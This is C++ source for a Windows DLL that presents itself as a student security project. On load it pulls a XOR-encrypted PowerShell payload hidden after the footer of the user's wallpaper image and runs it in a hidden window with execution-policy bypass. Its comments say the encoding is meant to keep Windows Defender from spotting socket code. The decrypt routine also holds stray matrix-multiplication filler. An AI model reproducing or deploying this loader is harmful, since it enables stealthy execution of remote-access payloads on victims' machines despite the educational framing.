/* 
* DONE BY STUDENT: Bahaa Nofal, Date: 29/12/2025
* 
* RESOURCES: 
* 1. https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
* 2. https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa
* 3. https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
* 4. https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
* 5. https://www.ired.team/
* 6. https://www.exploit-db.com/
* 7. https://forum.aspose.com/t/how-to-add-custom-data-to-jpeg/311374
*
* WHAT IS THIS PROJECT ABOUT?
* In the following code, I try to implement a DLL that is responsible for mainly two things:
*   A. Extracting a hidden PowerShell script hidden inside the infetcted background image, which
*      I planned inside with encrypting methods explained later and in other scripts.
*   B. Passing the extracted script to PowerShell to execute.
* 
* PLEASE NOTE: This is my first time trying to implement such a project. DLLs theory is way 
* different than its practical implementation. I am sorry for any mistakes that might occur while
* trying to implement this project. 
* 
* IMPORTANT WARNING: This code is for educational purposes only. Misuse of this code can lead to
* serious consequences. I only implemented this as a project for my university's course. I am not
* responsible for any malicious use of this code.
* 
* SUPERVISOR AND INSTRUCTOR: Professor Mohammad Massoud - Al-Zaytoonah University of Jordan
*/

#include "pch.h"
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <iostream>

using namespace std;

int A[3][3] = {
    {1, 2, 3},
    {4, 5, 6},
    {7, 8, 9}
};

int B[3][3] = {
    {9, 8, 7},
    {6, 5, 4},
    {3, 2, 1}
};

/*
Libraries Used Earlier (INCLUDING):
#include <pch.h>: Precompiled header for faster compilation.
#include <windows.h>: Windows API functions and types.
#include <string>: C++ string class.
#include <fstream>: File stream operations.
#include <vector>: C++ vector class.
#include <iostream>: Input and output stream operations.
*/

const char XOR_KEY = 0x35; // THE NEEDED XOR KEY FOR DECRYPTION

std::string Decrypt(std::string data) {
    std::string output = data;
    int C[3][3] = { 0 };
    for (int i = 0; i < 3; i++)
        for (int j = 0; j < 3; j++)
            for (int k = 0; k < 3; k++)
                C[i][j] += A[i][k] * B[k][j];
    for (size_t i = 0; i < data.size(); i++) {
        output[i] = data[i] ^ XOR_KEY;
    }
    for (int i = 0; i < 3; i++) {
        for (int j = 0; j < 3; j++)
            cout << C[i][j] << " ";
        cout << endl;
    }
    return output;
}

void Execute() {

    /*
    Delay for 3 seconds: In some cases devices may have a problem loading immediately. I found many malware
	writers use this technique, so they ensure that the environment is fully loaded before execution.
    */

    char path[MAX_PATH];
    DWORD size = sizeof(path);
    HKEY hkey;

    // Registery loading and access to the current wallpaper.
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hkey, "Wallpaper", NULL, NULL, (LPBYTE)path, &size) != ERROR_SUCCESS) {
            RegCloseKey(hkey);
            return;
        }
        RegCloseKey(hkey);
    }

    // Reading image binary data
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return;
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    /*
    Image Binary Data:
    Most image viewrs are designed to start reading at the header and stop exactly at the footer.
    Mostly, as explained in the 7th resource above, they ignore any extra data after that footer.
    The footer, which is mostly (FF D9), is the address we are looking for. 
    However, the decryption does not need to look for the footer. It only depends on two things:
         A. Where did the file start?
         B. Where did it end?

         Where did it start: I added START_HERE string after the footer bytes immediately so the
         code extracts contents immediately after it.
		 Where did it end: I added END_HERE string at the end of the hidden payload.

		 THE HIDDEN PAYLOAD IS THE BASE64 ENCODED POWERSHELL SCRIPT, WHICH IS XOR-ENCRYPTED.

         I explained about the encryption and encoding in the documentation provided with the project.

         By appending the XOR encrypted Base64 string, the image remains perfectly valid. The only catch
		 now that it has inside a bacteria setting, fully encapsulated, waiting to be executed.
    */

	// The following code extracts the hidden payload
    std::string s_mark = "START_HERE";
    std::string value = "THIS IS SOME RANDOM CODE";
    std::string e_mark = "END_HERE";
    size_t start = content.find(s_mark);
    size_t end = content.find(e_mark);

	// Here it extracts and decrypts the hidden payload if both markers are found
    if (start != std::string::npos && end != std::string::npos) {
        size_t p_start = start + s_mark.length();
        std::string scrambled = content.substr(p_start, end - p_start);

		// Base64 Decryption after XOR Decryption
        std::string decryptedPayload = Decrypt(scrambled);

        /*
        CRITICAL CHANGE:
        Instead of -Command, we use -EncodedCommand.
        PowerShell expects a Base64 string of a UTF-16LE encoded script.
        By providing the Base64 blob here, Windows Defender's static
        scanner cannot see 'socket' or 'TCPClient' until the very
        last second of execution.
        */
        std::string cmdStr = "powershell -W Hidden -NoP -NonI -EP Bypass -EncodedCommand " + decryptedPayload;

        // CreateProcessA requires a non-const char* (it can modify the buffer during execution)
        std::vector<char> cmdBuffer(cmdStr.begin(), cmdStr.end());
        cmdBuffer.push_back('\0'); // Null terminator

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(
            NULL,               // No module name (use command line)
            cmdBuffer.data(),   // Command line
            NULL,               // Process handle not inheritable
            NULL,               // Thread handle not inheritable
            FALSE,              // Set handle inheritance to FALSE
            CREATE_NO_WINDOW,   // Logic: Do not create a console window
            NULL,               // Use parent's environment block
            NULL,               // Use parent's starting directory 
            &si,                // Pointer to STARTUPINFO structure
            &pi)                // Pointer to PROCESS_INFORMATION structure
            ) {
            // Successfully started! Close handles to avoid memory leaks
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// DLL Main Function (Entry Point)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Execute, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}